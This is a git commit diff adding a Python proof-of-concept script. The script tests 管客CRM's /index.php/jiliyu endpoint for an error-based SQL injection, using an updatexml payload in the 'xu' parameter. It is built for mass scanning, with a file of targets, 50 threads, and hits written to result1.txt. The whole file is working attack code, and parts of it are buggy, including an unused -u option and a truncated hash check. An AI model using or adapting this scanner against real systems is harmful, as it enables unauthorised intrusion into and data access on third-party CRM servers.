9a4547c5b279639516d8adb3553109ed0f0ba4f9
zhou386 <964019870@qq.com>
2025-08-17 22:47:03 +0800

    Update 1.py

--- 目录/管客CRM jiliyu接口存在SQL漏洞/1.py
+++ 目录/管客CRM jiliyu接口存在SQL漏洞/1.py
@@ -1,1 +1,51 @@
+import argparse,sys,requests,json
+from multiprocessing.dummy import Pool
+def poc(target):
+    payload="/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20md5(1)),0x7f),1)) "
+    headres={
+        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
+        "Accept": "*/*",
+        "Connection": "Keep-Alive"
+    }
+    target = target.strip()
+    if not target.startswith(('http://', 'https://')):
+        target = 'http://' + target
+    try:
+        res1=requests.get(url=target,headers=headres)
+        if res1.status_code == 200:
+            res2=requests.get(url=target+payload,headers=headres)
+            if 'c4ca4238a0b923820dcc509a6f75849' in res2.text:
+                print(f"[+]{target}存在sql漏洞")
+                with open('result1.txt','a',encoding='utf-8') as fp:
+                    fp.write(target+'\n')
+            else:
+                print(f"[-]该{target}不存在sql漏洞")
+        else:
+            print(f"[*]该{target}存在问题,请手工测试")        
+    except:
+        pass
+def main():
+    #定义
+    parser=argparse.ArgumentParser(description="管客CRM jiliyu接口存在SQL漏洞")
+    # 添加命令行参数
+    parser.add_argument('-u','--url',dest='url',type=str,help='place input lik')
+    parser.add_argument('-f','--file',dest='file',type=str,help='place input your le path')
+    # 实例化
+    args=parser.parse_args()
+    # 判断用户的输入
+    if args.url and not args.file:
+        print(args.url)
+    if args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8')as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip())
+        mp=Pool(50)
+        mp.map(poc,url_list)
+        mp.close
+        mp.join
+    else:
+        print(f"Usage: python{sys.argv[0]} -h")
+if __name__=='__main__':
+    main()
 
